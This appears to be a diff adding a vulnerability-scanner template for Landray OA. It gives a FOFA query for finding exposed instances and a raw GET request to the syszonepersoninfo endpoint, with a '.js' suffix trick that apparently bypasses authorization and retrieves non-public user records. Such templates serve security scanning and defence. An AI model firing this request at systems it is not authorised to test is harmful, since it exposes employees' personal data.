@@ -1,0 +1,26 @@
+id: landray-oa-syszonepersoninfo-info-leak
+
+info:
+  name: "蓝凌OA syszonepersoninfo 接口敏感数据泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="Landray-OA系统"
+          Landray智能OA系统通过整合钉钉数字化架构与蓝凌OA产品技术体系，构建企业移动办公解决方案，其syszonepersoninfo接口存在未授权访问缺陷，攻击者可利用该接口获取非公开用户信息数据。
+  tags: 蓝凌OA
+
+http:
+- raw:
+  - |
+    GET /sys/zone/sys_zone_personInfo/sysZonePersonInfo.do?.js?&method=searchPerson&orderby&ordertype=up&rowsize=20&s_ajax=true HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'property'
